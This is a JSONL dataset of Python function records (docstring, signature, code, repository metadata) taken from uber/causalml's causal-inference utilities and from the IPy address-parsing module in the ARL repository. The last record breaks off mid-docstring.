{"docstring": "\"\"\"\nRank features based on the LRT-statistics of the interaction.\n\nParameters\n----------\ndata (pd.Dataframe): DataFrame containing outcome, features, and experiment group\ntreatment_indicator (string): the column name for binary indicator of treatment (value 1) or control (value 0) \nfeature_name (string): feature name, as one column in the data DataFrame\ny_name (string): name of the outcome variable\n\nReturns\n----------\n(pd.DataFrame): a data frame containing the feature importance statistics\n\"\"\"\n", "func_signal": "def filter_LR(self, data, treatment_indicator, features, y_name, disp=True):\n", "code": "all_result = pd.DataFrame()\nfor x_name_i in features: \n    one_result = self._filter_LR_one_feature(data=data, \n        treatment_indicator=treatment_indicator, feature_name=x_name_i, y_name=y_name, disp=disp\n    )\n    all_result = pd.concat([all_result, one_result])\n\nall_result = all_result.sort_values(by='score', ascending=False)\nall_result['rank'] = all_result['score'].rank(ascending=False)\n\nreturn all_result", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nCalculate the multi-treatment unconditional D (one node)\nwith Euclidean Distance as split Evaluation function.\n\nParameters\n----------\nnodeSummary (dict): a dictionary containing the statistics for a tree node sample\ncontrol_group (string, optional, default='control'): the name for control group        \n\"\"\"\n", "func_signal": "def _evaluate_ED(nodeSummary, control_group='control'):\n", "code": "if control_group not in nodeSummary:\n    return 0\npc = nodeSummary[control_group][0]\nd_res = 0\nfor treatment_group in nodeSummary:\n    if treatment_group != control_group:\n        d_res += 2 * (nodeSummary[treatment_group][0] - pc)**2\nreturn d_res", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "'''\nCalculate the weighted mean of a variable given an arbitrary\nsample weight. Formulas from:\n\nAustin, Peter C., and Elizabeth A. Stuart. 2015. Moving towards Best\nPractice When Using Inverse Probability of Treatment Weighting (IPTW)\nUsing the Propensity Score to Estimate Causal Treatment Effects in\nObservational Studies.\nStatistics in Medicine 34 (28): 3661 79. https://doi.org/10.1002/sim.6607.\n'''\n", "func_signal": "def _get_wmean_wvar(X, weight):\n", "code": "weighted_mean = np.sum(weight * X) / np.sum(weight)\nweighted_var = (np.sum(weight) / (np.power(np.sum(weight), 2) - np.sum(\n    np.power(weight, 2)))) * (np.sum(weight * np.power((X - weighted_mean), 2)))\n\nreturn [weighted_mean, weighted_var]", "path": "causalml/causalml/metrics/visualize.py", "commit_date": "2020-12-14 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Generate a summary for predictions on synthetic data for train and holdout using specified function\n\nArgs:\n    synthetic_data_func (function): synthetic data generation function\n    n (int, optional): number of samples per simulation\n    valid_size(float,optional): validation/hold out data size\n    k (int, optional): number of simulations\n\n\nReturns:\n    (tuple): summary evaluation metrics of predictions for train and validation:\n\n      - summary_train (pandas.DataFrame): training data evaluation summary\n      - summary_train (pandas.DataFrame): validation data evaluation summary\n\"\"\"\n\n", "func_signal": "def get_synthetic_summary_holdout(synthetic_data_func, n=1000, valid_size=0.2, k=1):\n", "code": "summaries_train = []\nsummaries_validation = []\n\nfor i in range(k):\n    preds_dict_train, preds_dict_valid = get_synthetic_preds_holdout(synthetic_data_func, n=n,\n                                                                     valid_size=valid_size)\n    actuals_train = preds_dict_train[KEY_ACTUAL]\n    actuals_validation = preds_dict_valid[KEY_ACTUAL]\n\n    synthetic_summary_train = pd.DataFrame({label: [preds.mean(), mse(preds, actuals_train)] for label, preds\n                                            in preds_dict_train.items() if KEY_GENERATED_DATA not in label.lower()},\n                                           index=['ATE', 'MSE']).T\n    synthetic_summary_train['Abs % Error of ATE'] = np.abs(\n        (synthetic_summary_train['ATE']/synthetic_summary_train.loc[KEY_ACTUAL, 'ATE']) - 1)\n\n    synthetic_summary_validation = pd.DataFrame({label: [preds.mean(), mse(preds, actuals_validation)]\n                                                 for label, preds in preds_dict_valid.items()\n                                                 if KEY_GENERATED_DATA not in label.lower()},\n                                                index=['ATE', 'MSE']).T\n    synthetic_summary_validation['Abs % Error of ATE'] = np.abs(\n        (synthetic_summary_validation['ATE']/synthetic_summary_validation.loc[KEY_ACTUAL, 'ATE']) - 1)\n\n    # calculate kl divergence for training\n    for label in synthetic_summary_train.index:\n        stacked_values = np.hstack((preds_dict_train[label], actuals_train))\n        stacked_low = np.percentile(stacked_values, 0.1)\n        stacked_high = np.percentile(stacked_values, 99.9)\n        bins = np.linspace(stacked_low, stacked_high, 100)\n\n        distr = np.histogram(preds_dict_train[label], bins=bins)[0]\n        distr = np.clip(distr/distr.sum(), 0.001, 0.999)\n        true_distr = np.histogram(actuals_train, bins=bins)[0]\n        true_distr = np.clip(true_distr/true_distr.sum(), 0.001, 0.999)\n\n        kl = entropy(distr, true_distr)\n        synthetic_summary_train.loc[label, 'KL Divergence'] = kl\n\n    # calculate kl divergence for validation\n    for label in synthetic_summary_validation.index:\n        stacked_values = np.hstack((preds_dict_valid[label], actuals_validation))\n        stacked_low = np.percentile(stacked_values, 0.1)\n        stacked_high = np.percentile(stacked_values, 99.9)\n        bins = np.linspace(stacked_low, stacked_high, 100)\n\n        distr = np.histogram(preds_dict_valid[label], bins=bins)[0]\n        distr = np.clip(distr/distr.sum(), 0.001, 0.999)\n        true_distr = np.histogram(actuals_validation, bins=bins)[0]\n        true_distr = np.clip(true_distr/true_distr.sum(), 0.001, 0.999)\n\n        kl = entropy(distr, true_distr)\n        synthetic_summary_validation.loc[label, 'KL Divergence'] = kl\n\n    summaries_train.append(synthetic_summary_train)\n    summaries_validation.append(synthetic_summary_validation)\n\nsummary_train = sum(summaries_train) / k\nsummary_validation = sum(summaries_validation) / k\nreturn (summary_train[['Abs % Error of ATE', 'MSE', 'KL Divergence']],\n        summary_validation[['Abs % Error of ATE', 'MSE', 'KL Divergence']])", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Generates a bar plot comparing learner performance.\n\nArgs:\n    synthetic_summary (pd.DataFrame): summary generated by get_synthetic_summary()\n    k (int): number of simulations (used only for plot title text)\n    drop_learners (list, optional): list of learners (str) to omit when plotting\n    drop_cols (list, optional): list of metrics (str) to omit when plotting\n    sort_cols (list, optional): list of metrics (str) to sort on when plotting\n\"\"\"\n", "func_signal": "def bar_plot_summary(synthetic_summary, k, drop_learners=[], drop_cols=[], sort_cols=['MSE', 'Abs % Error of ATE']):\n", "code": "plot_data = synthetic_summary.sort_values(sort_cols, ascending=True)\nplot_data = plot_data.drop(drop_learners + [KEY_ACTUAL]).drop(drop_cols, axis=1)\n\nplot_data.plot(kind='bar', figsize=(12, 8))\nplt.xticks(rotation=30)\nplt.title('Learner Performance (averaged over k={} simulations)'.format(k))", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Calculate the inverse probability of treatment weighted standardized\ndifferences in covariate means between the treatment and the control.\nIf weighting is set to 'False', calculate unweighted standardized\ndifferences. Accepts only continuous and binary numerical variables.\n\"\"\"\n", "func_signal": "def get_std_diffs(X, W, weight=None, weighted=False, numeric_threshold=5):\n", "code": "cont_cols, prop_cols = _get_numeric_vars(X, threshold=numeric_threshold)\ncols = cont_cols + prop_cols\n\nif len(cols) == 0:\n    raise ValueError(\n        \"No variable passed the test for continuous or binary variables.\")\n\ntreat = (W == 1)\ncontr = (W == 0)\n\nX_1 = X.loc[treat, cols]\nX_0 = X.loc[contr, cols]\n\ncont_index = np.array([col in cont_cols for col in cols])\nprop_index = np.array([col in prop_cols for col in cols])\n\nstd_diffs_cont = np.empty(sum(cont_index))\nstd_diffs_prop = np.empty(sum(prop_index))\n\nif weighted:\n    assert weight is not None, 'weight should be provided when weighting is set to \"True\"'\n\n    weight_1 = weight[treat]\n    weight_0 = weight[contr]\n\n    X_1_mean, X_1_var = np.apply_along_axis(\n        lambda x: _get_wmean_wvar(x, weight_1), 0, X_1)\n    X_0_mean, X_0_var = np.apply_along_axis(\n        lambda x: _get_wmean_wvar(x, weight_0), 0, X_0)\n\nelif not weighted:\n    X_1_mean, X_1_var = np.apply_along_axis(\n        lambda x: _get_mean_var(x), 0, X_1)\n    X_0_mean, X_0_var = np.apply_along_axis(\n        lambda x: _get_mean_var(x), 0, X_0)\n\nX_1_mean_cont, X_1_var_cont = X_1_mean[cont_index], X_1_var[cont_index]\nX_0_mean_cont, X_0_var_cont = X_0_mean[cont_index], X_0_var[cont_index]\n\nstd_diffs_cont = ((X_1_mean_cont - X_0_mean_cont) /\n                  np.sqrt((X_1_var_cont + X_0_var_cont) / 2))\n\nX_1_mean_prop = X_1_mean[prop_index]\nX_0_mean_prop = X_0_mean[prop_index]\n\nstd_diffs_prop = ((X_1_mean_prop - X_0_mean_prop) /\n                  np.sqrt(((X_1_mean_prop * (1 - X_1_mean_prop)) + (X_0_mean_prop * (1 - X_0_mean_prop))) / 2))\n\nstd_diffs = np.concatenate([std_diffs_cont, std_diffs_prop], axis=0)\nstd_diffs_df = pd.DataFrame(std_diffs, index=cols)\n\nreturn std_diffs_df", "path": "causalml/causalml/metrics/visualize.py", "commit_date": "2020-12-14 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Generates a bar plot comparing learner performance by training and validation\n\nArgs:\n    train_summary (pd.DataFrame): summary for training synthetic data generated by get_synthetic_summary_holdout()\n    validation_summary (pd.DataFrame): summary for validation synthetic data generated by\n        get_synthetic_summary_holdout()\n    k (int): number of simulations (used only for plot title text)\n    drop_learners (list, optional): list of learners (str) to omit when plotting\n    drop_cols (list, optional): list of metrics (str) to omit when plotting\n\"\"\"\n", "func_signal": "def bar_plot_summary_holdout(train_summary, validation_summary, k, drop_learners=[], drop_cols=[]):\n", "code": "train_summary = train_summary.drop([KEY_ACTUAL])\ntrain_summary['Learner'] = train_summary.index\n\nvalidation_summary = validation_summary.drop([KEY_ACTUAL])\nvalidation_summary['Learner'] = validation_summary.index\n\nfor metric in ['Abs % Error of ATE', 'MSE', 'KL Divergence']:\n    plot_data_sub = pd.DataFrame(train_summary.Learner).reset_index(drop=True)\n    plot_data_sub['train'] = train_summary[metric].values\n    plot_data_sub['validation'] = validation_summary[metric].values\n    plot_data_sub = plot_data_sub.set_index('Learner')\n    plot_data_sub = plot_data_sub.drop(drop_learners).drop(drop_cols, axis=1)\n    plot_data_sub = plot_data_sub.sort_values('train', ascending=True)\n\n    plot_data_sub.plot(kind='bar', color=['red', 'blue'], figsize=(12, 8))\n    plt.xticks(rotation=30)\n    plt.title('Learner Performance of {} (averaged over k={} simulations)'.format(metric, k))", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Plot covariate balances (standardized differences between the treatment and the control)\nbefore and after weighting the sample using the inverse probability of treatment weights.\n\n Args:\n    df (pandas.DataFrame): a data frame containing the covariates and treatment indicator\n    covariate_col (list of str): a list of columns that are used a covariates\n    treatment_col (str, optional): the column name for the treatment indicator (0 or 1)\n    p_col (str, optional): the column name for propensity score\n\"\"\"\n", "func_signal": "def plot_ps_diagnostics(df, covariate_col, treatment_col='w', p_col='p'):\n", "code": "X = df[covariate_col]\nW = df[treatment_col]\nPS = df[p_col]\n\nIPTW = get_simple_iptw(W, PS)\n\ndiffs_pre = get_std_diffs(X, W, weighted=False)\nnum_unbal_pre = (np.abs(diffs_pre) > 0.1).sum()[0]\n\ndiffs_post = get_std_diffs(X, W, IPTW, weighted=True)\nnum_unbal_post = (np.abs(diffs_post) > 0.1).sum()[0]\n\ndiff_plot = _plot_std_diffs(diffs_pre,\n                            num_unbal_pre,\n                            diffs_post,\n                            num_unbal_post)\n\nreturn diff_plot", "path": "causalml/causalml/metrics/visualize.py", "commit_date": "2020-12-14 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Generate a summary for predictions on synthetic data using specified function\n\nArgs:\n    synthetic_data_func (function): synthetic data generation function\n    n (int, optional): number of samples per simulation\n    k (int, optional): number of simulations\n\"\"\"\n", "func_signal": "def get_synthetic_summary(synthetic_data_func, n=1000, k=1, estimators={}):\n", "code": "summaries = []\n\nfor i in range(k):\n    synthetic_preds = get_synthetic_preds(synthetic_data_func, n=n, estimators=estimators)\n    actuals = synthetic_preds[KEY_ACTUAL]\n    synthetic_summary = pd.DataFrame({label: [preds.mean(), mse(preds, actuals)] for label, preds\n                                      in synthetic_preds.items() if label != KEY_GENERATED_DATA},\n                                     index=['ATE', 'MSE']).T\n\n    synthetic_summary['Abs % Error of ATE'] = np.abs((synthetic_summary['ATE'] /\n                                                      synthetic_summary.loc[KEY_ACTUAL, 'ATE']) - 1)\n\n    for label in synthetic_summary.index:\n        stacked_values = np.hstack((synthetic_preds[label], actuals))\n        stacked_low = np.percentile(stacked_values, 0.1)\n        stacked_high = np.percentile(stacked_values, 99.9)\n        bins = np.linspace(stacked_low, stacked_high, 100)\n\n        distr = np.histogram(synthetic_preds[label], bins=bins)[0]\n        distr = np.clip(distr/distr.sum(), 0.001, 0.999)\n        true_distr = np.histogram(actuals, bins=bins)[0]\n        true_distr = np.clip(true_distr/true_distr.sum(), 0.001, 0.999)\n\n        kl = entropy(distr, true_distr)\n        synthetic_summary.loc[label, 'KL Divergence'] = kl\n\n    summaries.append(synthetic_summary)\n\nsummary = sum(summaries) / k\nreturn summary[['Abs % Error of ATE', 'MSE', 'KL Divergence']]", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Generates a scatter plot comparing learner performance. Each learner's performance is plotted as a point in the\n(Abs % Error of ATE, MSE) space.\n\nArgs:\n    synthetic_summary (pd.DataFrame): summary generated by get_synthetic_summary()\n    k (int): number of simulations (used only for plot title text)\n    drop_learners (list, optional): list of learners (str) to omit when plotting\n    drop_cols (list, optional): list of metrics (str) to omit when plotting\n\"\"\"\n", "func_signal": "def scatter_plot_summary(synthetic_summary, k, drop_learners=[], drop_cols=[]):\n", "code": "plot_data = synthetic_summary.drop(drop_learners).drop(drop_cols, axis=1)\n\nfig, ax = plt.subplots()\nfig.set_size_inches(12, 8)\nxs = plot_data['Abs % Error of ATE']\nys = plot_data['MSE']\n\nax.scatter(xs, ys)\n\nylim = ax.get_ylim()\nxlim = ax.get_xlim()\n\nfor i, txt in enumerate(plot_data.index):\n    ax.annotate(txt, (xs[i] - np.random.binomial(1, 0.5)*xlim[1]*0.04, ys[i] - ylim[1]*0.03))\n\nax.set_xlabel('Abs % Error of ATE')\nax.set_ylabel('MSE')\nax.set_title('Learner Performance (averaged over k={} simulations)'.format(k))", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Attempt to determine which variables are numeric and which\nare categorical. The threshold for a 'continuous' variable\nis set to 5 by default.\n\"\"\"\n\n", "func_signal": "def _get_numeric_vars(X, threshold=5):\n", "code": "cont = [(not hasattr(X.iloc[:, i], 'cat')) and (\n    X.iloc[:, i].nunique() >= threshold) for i in range(X.shape[1])]\n\nprop = [X.iloc[:, i].nunique(\n) == 2 for i in range(X.shape[1])]\n\ncont_cols = list(X.loc[:, cont].columns)\nprop_cols = list(X.loc[:, prop].columns)\n\ndropped = set(X.columns) - set(cont_cols + prop_cols)\n\nif dropped:\n    logger.info('Some non-binary variables were dropped because they had fewer than {} unique values or were of the \\\n                 dtype \"cat\". The dropped variables are: {}'.format(threshold, dropped))\n\nreturn cont_cols, prop_cols", "path": "causalml/causalml/metrics/visualize.py", "commit_date": "2020-12-14 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "'''\nConvert the tree to string for print.\n\nArgs\n----\n\ndecisionTree : object\n    object of DecisionTree class\n\nx_names : list\n    List of feature names\n\nReturns\n-------\nA string representation of the tree.\n'''\n\n# Column Heading\n", "func_signal": "def uplift_tree_string(decisionTree, x_names):\n", "code": "dcHeadings = {}\nfor i, szY in enumerate(x_names + ['treatment_group_key']):\n    szCol = 'Column %d' % i\n    dcHeadings[szCol] = str(szY)\n\ndef toString(decisionTree, indent=''):\n    if decisionTree.results is not None:  # leaf node\n        return str(decisionTree.results)\n    else:\n        szCol = 'Column %s' % decisionTree.col\n        if szCol in dcHeadings:\n            szCol = dcHeadings[szCol]\n        if isinstance(decisionTree.value, int) or isinstance(decisionTree.value, float):\n            decision = '%s >= %s?' % (szCol, decisionTree.value)\n        else:\n            decision = '%s == %s?' % (szCol, decisionTree.value)\n        trueBranch = indent + 'yes -> ' + toString(decisionTree.trueBranch, indent + '\\t\\t')\n        falseBranch = indent + 'no  -> ' + toString(decisionTree.falseBranch, indent + '\\t\\t')\n        return (decision + '\\n' + trueBranch + '\\n' + falseBranch)\n\nprint(toString(decisionTree))", "path": "causalml/causalml/inference/tree/plot.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nCalculate the multi-treatment unconditional D (one node)\nwith KL Divergence as split Evaluation function.\n\nParameters\n----------\nnodeSummary (dict): a dictionary containing the statistics for a tree node sample\ncontrol_group (string, optional, default='control'): the name for control group \n\nNotes\n-----\nThe function works for more than one non-control treatment groups.\n\"\"\"\n", "func_signal": "def _evaluate_KL(self, nodeSummary, control_group='control'):\n", "code": "if control_group not in nodeSummary:\n    return 0\npc = nodeSummary[control_group][0]\nd_res = 0\nfor treatment_group in nodeSummary:\n    if treatment_group != control_group:\n        d_res += self._kl_divergence(nodeSummary[treatment_group][0], pc)\nreturn d_res", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nGet the 802.3 MAC address from IPv6 RFC 2464 address, in lower case.\nReturn None if the address is an IPv4 or not a IPv6 RFC 2464 address.\n\n>>> IP('fe80::f66d:04ff:fe47:2fae').get_mac()\n'f4:6d:04:47:2f:ae'\n\"\"\"\n", "func_signal": "def get_mac(self):\n", "code": "if self._ipversion != 6:\n    return None\nif (self.ip & 0x20000ffff000000) != 0x20000fffe000000:\n    return None\nreturn '%02x:%02x:%02x:%02x:%02x:%02x' % (\n    (((self.ip >> 56) & 0xff) & 0xfd),\n    (self.ip >> 48) & 0xff,\n    (self.ip >> 40) & 0xff,\n    (self.ip >> 16) & 0xff,\n    (self.ip >> 8) & 0xff,\n    self.ip & 0xff,\n)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Checks if a netmask is expressable as a prefixlen.\"\"\"\n\n", "func_signal": "def _checkNetmask(netmask, masklen):\n", "code": "num = int(netmask)\nbits = masklen\n\n# remove zero bits at the end\nwhile (num & 1) == 0 and bits != 0:\n    num = num >> 1\n    bits -= 1\n    if bits == 0:\n        break\n# now check if the rest consists only of ones\nwhile bits > 0:\n    if (num & 1) == 0:\n        raise ValueError(\"Netmask 0x%x can't be expressed as an prefix.\" % netmask)\n    num = num >> 1\n    bits -= 1", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a string representation in the non-mangled format.\n\n>>> print(IP('127.0.0.1').strFullsize())\n127.0.0.1\n>>> print(IP('2001:0658:022a:cafe:0200::1').strFullsize())\n2001:0658:022a:cafe:0200:0000:0000:0001\n\"\"\"\n\n", "func_signal": "def strFullsize(self, wantprefixlen=None):\n", "code": "if self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 1\n\nreturn intToIp(self.ip, self._ipversion) + self._printPrefix(wantprefixlen)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return netmask as an integer.\n\n>>> \"%X\" % IP('195.185.0.0/16').netmask().int()\n'FFFF0000'\n\"\"\"\n\n# TODO: unify with prefixlenToNetmask?\n", "func_signal": "def netmask(self):\n", "code": "bits = _ipVersionToLen(self._ipversion)\nlocallen = bits - self._prefixlen\n\nreturn ((2 ** self._prefixlen) - 1) << locallen", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a string representation in hex format in lower case.\n\n>>> print(IP('127.0.0.1').strHex())\n0x7f000001\n>>> print(IP('2001:0658:022a:cafe:0200::1').strHex())\n0x20010658022acafe0200000000000001\n\"\"\"\n\n", "func_signal": "def strHex(self, wantprefixlen=None):\n", "code": "if self.WantPrefixLen == None and wantprefixlen == None:\n    wantprefixlen = 0\n\nx = '0x%x' % self.ip\nreturn x + self._printPrefix(wantprefixlen)", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Return a list with values forming the reverse lookup.\n\n>>> IP('213.221.113.87/32').reverseNames()\n['87.113.221.213.in-addr.arpa.']\n>>> IP('213.221.112.224/30').reverseNames()\n['224.112.221.213.in-addr.arpa.', '225.112.221.213.in-addr.arpa.', '226.112.221.213.in-addr.arpa.', '227.112.221.213.in-addr.arpa.']\n>>> IP('127.0.0.0/24').reverseNames()\n['0.0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/23').reverseNames()\n['0.0.127.in-addr.arpa.', '1.0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/16').reverseNames()\n['0.127.in-addr.arpa.']\n>>> IP('127.0.0.0/15').reverseNames()\n['0.127.in-addr.arpa.', '1.127.in-addr.arpa.']\n>>> IP('128.0.0.0/8').reverseNames()\n['128.in-addr.arpa.']\n>>> IP('128.0.0.0/7').reverseNames()\n['128.in-addr.arpa.', '129.in-addr.arpa.']\n>>> IP('::1:2').reverseNames()\n['2.0.0.0.1.ip6.arpa.']\n\"\"\"\n\n", "func_signal": "def reverseNames(self):\n", "code": "if self._ipversion == 4:\n    ret = []\n    # TODO: Refactor. Add support for IPint objects\n    if self.len() < 2 ** 8:\n        for x in self:\n            ret.append(x.reverseName())\n    elif self.len() < 2 ** 16:\n        for i in xrange(0, self.len(), 2 ** 8):\n            ret.append(self[i].reverseName()[2:])\n    elif self.len() < 2 ** 24:\n        for i in xrange(0, self.len(), 2 ** 16):\n            ret.append(self[i].reverseName()[4:])\n    else:\n        for i in xrange(0, self.len(), 2 ** 24):\n            ret.append(self[i].reverseName()[6:])\n    return ret\nelif self._ipversion == 6:\n    ipv4 = self._getIPv4Map()\n    if ipv4 is not None:\n        return ipv4.reverseNames()\n    s = \"%x\" % self.ip\n    if self._prefixlen % 4 != 0:\n        raise NotImplementedError(\"can't create IPv6 reverse names at sub nibble level\")\n    s = list(s)\n    s.reverse()\n    s = '.'.join(s)\n    first_nibble_index = int(32 - (self._prefixlen // 4)) * 2\n    return [\"%s.ip6.arpa.\" % s[first_nibble_index:]]\nelse:\n    raise ValueError(\"only IPv4 and IPv6 supported\")", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"Create an instance of an IP object.\n\nData can be a network specification or a single IP. IP\naddresses can be specified in all forms understood by\nparseAddress(). The size of a network can be specified as\n\n/prefixlen        a.b.c.0/24               2001:658:22a:cafe::/64\n-lastIP           a.b.c.0-a.b.c.255        2001:658:22a:cafe::-2001:658:22a:cafe:ffff:ffff:ffff:ffff\n/decimal netmask  a.b.c.d/255.255.255.0    not supported for IPv6\n\nIf no size specification is given a size of 1 address (/32 for\nIPv4 and /128 for IPv6) is assumed.\n\nIf make_net is True, an IP address will be transformed into the network\naddress by applying the specified netmask.\n\n>>> print(IP('127.0.0.0/8'))\n127.0.0.0/8\n>>> print(IP('127.0.0.0/255.0.0.0'))\n127.0.0.0/8\n>>> print(IP('127.0.0.0-127.255.255.255'))\n127.0.0.0/8\n>>> print(IP('127.0.0.1/255.0.0.0', make_net=True))\n127.0.0.0/8\n\nSee module documentation for more examples.\n\"\"\"\n\n# Print no Prefixlen for /32 and /128\n", "func_signal": "def __init__(self, data, ipversion=0, make_net=0):\n", "code": "self.NoPrefixForSingleIp = 1\n\n# Do we want prefix printed by default? see _printPrefix()\nself.WantPrefixLen = None\n\nnetbits = 0\nprefixlen = -1\n\n# handling of non string values in constructor\nif isinstance(data, INT_TYPES):\n    self.ip = int(data)\n    if ipversion == 0:\n        if self.ip <= MAX_IPV4_ADDRESS:\n            ipversion = 4\n        else:\n            ipversion = 6\n    if ipversion == 4:\n        if self.ip > MAX_IPV4_ADDRESS:\n            raise ValueError(\"IPv4 Address can't be larger than %x: %x\" % (MAX_IPV4_ADDRESS, self.ip))\n        prefixlen = 32\n    elif ipversion == 6:\n        if self.ip > MAX_IPV6_ADDRESS:\n            raise ValueError(\"IPv6 Address can't be larger than %x: %x\" % (MAX_IPV6_ADDRESS, self.ip))\n        prefixlen = 128\n    else:\n        raise ValueError(\"only IPv4 and IPv6 supported\")\n    self._ipversion = ipversion\n    self._prefixlen = prefixlen\n# handle IP instance as an parameter\nelif isinstance(data, IPint):\n    self._ipversion = data._ipversion\n    self._prefixlen = data._prefixlen\n    self.ip = data.ip\nelif isinstance(data, STR_TYPES):\n    # TODO: refactor me!\n    # splitting of a string into IP and prefixlen et. al.\n    x = data.split('-')\n    if len(x) == 2:\n        # a.b.c.0-a.b.c.255 specification ?\n        (ip, last) = x\n        (self.ip, parsedVersion) = parseAddress(ip)\n        if parsedVersion != 4:\n            raise ValueError(\"first-last notation only allowed for IPv4\")\n        (last, lastversion) = parseAddress(last)\n        if lastversion != 4:\n            raise ValueError(\"last address should be IPv4, too\")\n        if last < self.ip:\n            raise ValueError(\"last address should be larger than first\")\n        size = last - self.ip\n        netbits = _count1Bits(size)\n        # make sure the broadcast is the same as the last ip\n        # otherwise it will return /16 for something like:\n        # 192.168.0.0-192.168.191.255\n        if IP('%s/%s' % (ip, 32 - netbits)).broadcast().int() != last:\n            raise ValueError(\"the range %s is not on a network boundary.\" % data)\n    elif len(x) == 1:\n        x = data.split('/')\n        # if no prefix is given use defaults\n        if len(x) == 1:\n            ip = x[0]\n            prefixlen = -1\n        elif len(x) > 2:\n            raise ValueError(\"only one '/' allowed in IP Address\")\n        else:\n            (ip, prefixlen) = x\n            if prefixlen.find('.') != -1:\n                # check if the user might have used a netmask like\n                # a.b.c.d/255.255.255.0\n                (netmask, vers) = parseAddress(prefixlen)\n                if vers != 4:\n                    raise ValueError(\"netmask must be IPv4\")\n                prefixlen = _netmaskToPrefixlen(netmask)\n    elif len(x) > 2:\n        raise ValueError(\"only one '-' allowed in IP Address\")\n    else:\n        raise ValueError(\"can't parse\")\n\n    (self.ip, parsedVersion) = parseAddress(ip, ipversion)\n    if ipversion == 0:\n        ipversion = parsedVersion\n    if prefixlen == -1:\n        bits = _ipVersionToLen(ipversion)\n        prefixlen = bits - netbits\n    self._ipversion = ipversion\n    self._prefixlen = int(prefixlen)\n\n    if make_net:\n        self.ip = self.ip & _prefixlenToNetmask(self._prefixlen, self._ipversion)\n\n    if not _checkNetaddrWorksWithPrefixlen(self.ip,\n                                           self._prefixlen, self._ipversion):\n        raise ValueError(\"%s has invalid prefix length (%s)\" % (repr(self), self._prefixlen))\nelse:\n    raise TypeError(\"Unsupported data type: %s\" % type(data))", "path": "ARL/app/utils/IPy.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TophantTechnology/ARL", "stars": 4684, "license": "other", "language": "python", "size": 30503}
{"docstring": "\"\"\"\nInternal function used by parseAddress() to parse IPv6 address with ':'.\n\n>>> print(_parseAddressIPv6('::'))\n0\n>>> print(_parseAddressIPv6('::1'))\n1\n>>> print(_parseAddressIPv6('0:0:0:0:0:0:0:1'))\n1\n>>> print(_parseAddressIPv6('0:0:0::0:0:1'))\n1\n>>> print(_parseAddressIPv6('0:0:0:0:0:0:0:0'))\n0\n>>> print(_parseAddressIPv6('0:0:0::0:0:0'))\n0\n\n>>> print(_parseAddressIPv6('FEDC:BA98:7654:3210:FEDC:BA98:7654:3210'))\n338770000845734292534325025077361652240\n>>> print(_parseAddressIPv6('1080:0000:0000:0000:0008:0800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('1080:0:0:0:8:800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('1080:0::8:800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('1080::8:800:200C:417A'))\n21932261930451111902915077091070067066\n>>> print(_parseAddressIPv6('FF01:0:0:0:0:0:0:43'))\n338958331222012082418099330867817087043\n>>> print(_parseAddressIPv6('FF01:0:0::0:0:43'))\n338958331222012082418099330867817087043\n>>> 